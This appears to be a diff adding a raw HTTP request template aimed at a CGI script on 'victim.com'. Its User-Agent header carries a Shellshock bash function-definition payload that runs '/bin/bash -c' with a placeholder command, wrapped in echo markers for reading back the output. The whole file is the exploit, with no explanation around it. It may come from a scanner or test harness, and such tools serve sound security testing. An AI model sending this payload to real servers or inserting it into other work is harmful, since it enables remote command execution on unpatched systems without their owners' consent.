@@ -1,0 +1,5 @@
+GET http://victim.com/cgi-bin/test HTTP/1.1
+Host: victim.com
+Accept: */*
+User-Agent: () { :; }; echo; echo START;/bin/bash -c "INJECT";echo END;echo vish
+
